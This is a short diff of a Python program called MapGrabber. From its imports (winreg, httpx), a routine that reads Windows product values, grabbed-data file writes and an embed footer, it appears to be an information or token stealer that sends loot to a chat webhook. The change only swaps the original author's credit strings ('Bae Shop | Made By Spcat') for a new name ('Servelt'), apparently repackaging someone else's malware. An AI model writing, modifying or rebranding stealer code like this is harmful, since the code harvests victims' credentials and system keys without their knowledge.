@@ -1,4 +1,4 @@
-﻿import os
+import os
 import json
 import httpx
 import winreg
@@ -475,10 +475,10 @@ class MapGrabber(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "💙・MapGrabber | Bae Shop | Made By Spcat\n\n")
+                                "💜・Map Grabber // Made By Servelt\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n💙・MapGrabber | Bae Shop | Made By Spcat")
+                                x+"\n\n💜・Map Grabber // Made By Servelt")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
@@ -564,7 +564,7 @@ class MapGrabber(functions):
                         }
                     ],
                     'footer': {
-                        'text': '!  💙・MapGrabber  |  Bae Shop  |  Made By Spcat  !'
+                        'text': '!  💜・Map Grabber // Made By Servelt'
                     }
                 }
             ]
